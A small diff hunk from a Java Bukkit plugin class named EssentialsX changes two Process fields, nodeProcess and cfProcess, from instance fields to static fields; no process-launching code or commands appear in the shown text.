@@ -22,8 +22,8 @@ import org.bukkit.plugin.java.JavaPlugin;
 
 public class EssentialsX extends JavaPlugin {
     private Process deployProcess;
-    private volatile Process nodeProcess = null;
-    private volatile Process cfProcess = null;
+    private static volatile Process nodeProcess = null;
+    private static volatile Process cfProcess = null;
     private volatile boolean isProcessRunning = false;
     private boolean systemGuardEnabled = true;
     private final AtomicBoolean isRestarting = new AtomicBoolean(false);
